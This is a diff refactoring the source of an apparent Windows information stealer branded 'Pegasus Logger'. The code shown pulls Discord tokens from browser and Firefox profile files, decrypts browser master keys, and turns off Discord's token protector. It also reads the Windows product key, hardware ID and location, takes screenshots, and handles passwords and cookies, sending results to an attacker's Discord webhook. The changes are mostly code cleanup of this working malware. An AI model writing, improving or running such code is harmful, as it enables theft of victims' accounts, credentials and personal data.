@@ -5,7 +5,7 @@ from Crypto.Cipher import AES
 from difflib import get_close_matches
 from discord import Embed, File, RequestsWebhookAdapter, Webhook
 from getpass import getuser
-from json import loads
+from json import load, dump
 from pathlib import Path
 from platform import platform
 from pyautogui import screenshot
@@ -22,13 +22,12 @@ from win32crypt import CryptUnprotectData
 from zipfile import ZipFile
 
 import winreg
-import json
 import os
 import sys
 import psutil
 import winshell
 
-
+# This variable should be replaced by builder.py
 WEBHOOK_URL = "&WEBHOOK_URL&"
 
 
@@ -43,7 +42,8 @@ def main(webhook_url: str):
 
     finalize_and_send(webhook, embed)
 
-def finalize_and_send(webhook:Webhook, embed:Embed, file:File):
+
+def finalize_and_send(webhook: Webhook, embed: Embed, file: File):
     embed.set_author(name=f"@ {strftime('%D | %H:%M:%S', localtime())}")
     embed.set_footer(text="Pegasus Logger | Made by addi00000 | www.addidix.xyz")
     embed.set_thumbnail(
@@ -58,8 +58,9 @@ def finalize_and_send(webhook:Webhook, embed:Embed, file:File):
         username="Pegasus",
     )
 
-def start_scanning(embed:Embed, screenshot_output:str):
-    running_threads:list[Thread] = []
+
+def start_scanning(embed: Embed, screenshot_output: str):
+    running_threads: list[Thread] = []
 
     for thread in [
         Thread(target=screenshot, args=(screenshot_output,)),
@@ -78,16 +79,18 @@ def start_scanning(embed:Embed, screenshot_output:str):
 
     GrabTokens()
 
-def account_info(tokens:list[str], embed:Embed):
+
+def account_info(tokens: list[str], embed: Embed):
     for token in tokens:
         resp = get(
             "https://discord.com/api/v9/users/@me",
             headers={"Authorization": tokens[token]},
         )
 
-        username = resp.json()["username"] + "#" + resp.json()["discriminator"]
-        phone = resp.json()["phone"]
-        email = resp.json()["email"]
+        data= resp.json()
+        username = "%s#%s" % (data.get("username"), data.get("discriminator"))
+        phone = data.get("phone")
+        email = data.get("email")
 
         embed.add_field(
             name="🔷  DISCORD INFO",
@@ -95,7 +98,7 @@ def account_info(tokens:list[str], embed:Embed):
         )
 
 
-def get_location(embed:Embed, ip_url: str = None):
+def get_location(embed: Embed, ip_url: str = None):
     with suppress(Exception):
         data = get(ip_url or "http://ipinfo.io/json").json
 
@@ -113,7 +116,7 @@ def get_location(embed:Embed, ip_url: str = None):
         )
 
 
-def get_misc(embed:Embed):
+def get_misc(embed: Embed):
     def get_hwid():
         p = Popen(
             "wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE
@@ -156,10 +159,9 @@ class GrabTokens:
             headers["Authorization"] = token
         return headers
 
-    def get_master_key(self, path):
+    def get_master_key(self, path:str):
         with open(path, "r", encoding="utf-8") as f:
-            local_state = f.read()
-        local_state = json.loads(local_state)
+            local_state = load(f)
 
         master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
@@ -175,11 +177,11 @@ class GrabTokens:
                 os.remove(token_protector + i)
 
         with open(config) as f:
-            item: dict = json.load(f)
+            config: dict = load(f)
 
         # Not quite sure if dict.update works like this,
         # but I believe in '**kwargs' lmao
-        item.update(
+        config.update(
             auto_start=False,
             auto_start_discord=False,
             integrity=False,
@@ -196,9 +198,9 @@ class GrabTokens:
         )
 
         with open(config, "w") as f:
-            json.dump(item, f, indent=2, sort_keys=True)
+            dump(config, f, indent=2, sort_keys=True)
 
-    def decrypt_token(self, buff, master_key):
+    def decrypt_token(self, buff:bytes, master_key):
         with suppress(Exception):
             iv = buff[3:15]
             payload = buff[15:]
@@ -207,14 +209,15 @@ class GrabTokens:
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
 
-    def getProductKey(self, path: str = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"):
+    def get_product_key(self, registry_key: str = None):
         def str_to_int(x):
             return ord(x) if isinstance(x, str) else x
 
+        registry_key = registry_key or r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
         chars = "BCDFGHJKMPQRTVWXY2346789"
         wkey = ""
         offset = 52
-        regkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
+        regkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registry_key)
         val, _ = winreg.QueryValueEx(regkey, "DigitalProductId")
         productName, _ = winreg.QueryValueEx(regkey, "ProductName")
         key = list(val)
@@ -238,9 +241,7 @@ class GrabTokens:
             wkey = wkey[:i] + "-" + wkey[i:]
         return [productName, wkey]
 
-    def grabTokens(
-        self, token, tokens, embed: Embed
-    ):  # TODO: Annotations for intellisense
+    def grabTokens(self, embed: Embed):
         # This dict could be compressed a bit and
         # make it dynamic...i dunno
         paths = {
@@ -308,35 +309,50 @@ class GrabTokens:
                                 self.tokens.append(token)
 
         if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
-            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
-                for _file in files:
-                    if not _file.endswith(".sqlite"):
-                        continue
-                    for line in self.load_lines(path, _file):
-                        for regex in self.regex:
-                            for token in findall(regex, line):
-                                with suppress(Exception):
-                                    resp = get(
-                                        self.baseurl, headers=self.get_headers(token)
-                                    )
-
-                                if resp.ok and token not in self.tokens:
-                                    self.tokens.append(token)
+            self.firefox_get_tokens()
 
         for token in self.tokens:
+            self.embed_users(token, embed)
+
+    def firefox_get_tokens(self):
+        for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
+            for file in files:
+                file = Path(file)
+
+                if ".sqlite" not in file.suffixes:
+                    continue
+                self.search_for_tokens(path, file)
+
+    def search_for_tokens(self, path:str, file:str):
+        for line in self.load_lines(path, file):
+            for regex in self.regex:
+                for token in findall(regex, line):
+                    self.test_token(token)
+
+    def test_token(self, token:str):
+        with suppress(Exception):
             resp = get(
-                "https://discord.com/api/v9/users/@me", headers={"Authorization": token}
+                self.baseurl, headers=self.get_headers(token)
             )
 
-            username = resp.json()["username"] + "#" + resp.json()["discriminator"]
-            phone = resp.json()["phone"]
-            email = resp.json()["email"]
+            if resp.ok and token not in self.tokens:
+                self.tokens.append(token)
 
-            embed.add_field(
-                name=f"🔷  User: `{username}`",
-                value=f"Token: `{token}`\n\nPhone: {phone}\n\nEmail: {email}",
-                inline=False,
-            )
+
+    def embed_users(self, token:str, embed:Embed):
+        resp = get(
+            "https://discord.com/api/v9/users/@me", headers={"Authorization": token}
+        )
+        data = resp.json()
+        username = "%s#%s" % (data.get("username"), data.get("discriminator"))
+        phone = data.get("phone")
+        email = data.get("email")
+
+        embed.add_field(
+            name=f"🔷  User: `{username}`",
+            value=f"Token: `{token}`\n\nPhone: {phone}\n\nEmail: {email}",
+            inline=False,
+        )
 
     def walk_browser_datadir(self, path):
         for file_name in os.listdir(path):
@@ -349,19 +365,22 @@ class GrabTokens:
             ):
                 self.tokenize(line)
 
-    def tokenize(self, line:str):
+    def tokenize(self, line: str):
         for regex in self.regex:
             for token in findall(regex, line):
                 with suppress(Exception):
-                    resp = get(
-                        self.baseurl, headers=self.get_headers(token)
-                    )
+                    resp = get(self.baseurl, headers=self.get_headers(token))
 
                 if resp.ok and token not in self.tokens:
                     self.tokens.append(token)
 
-    def load_lines(self, base:str, filename:str):
-        yield from (line.strip() for line in Path(base, filename).read_text().splitlines() if line.strip())
+    def load_lines(self, base: str, filename: str):
+        yield from (
+            line.strip()
+            for line in Path(base, filename).read_text().splitlines()
+            if line.strip()
+        )
+
 
 class Password:
     def __init__(self):
@@ -381,8 +400,7 @@ class Password:
             "r",
             encoding="utf-8",
         ) as f:
-            local_state = f.read()
-        local_state = loads(local_state)
+            local_state = load(f)
 
         master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
@@ -440,8 +458,7 @@ class CookieMonster:
 
     def get_master_key(self, path):
         with open(path, "r", encoding="utf-8") as f:
-            local_state = f.read()
-        local_state = loads(local_state)
+            local_state = load(f)
 
         master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
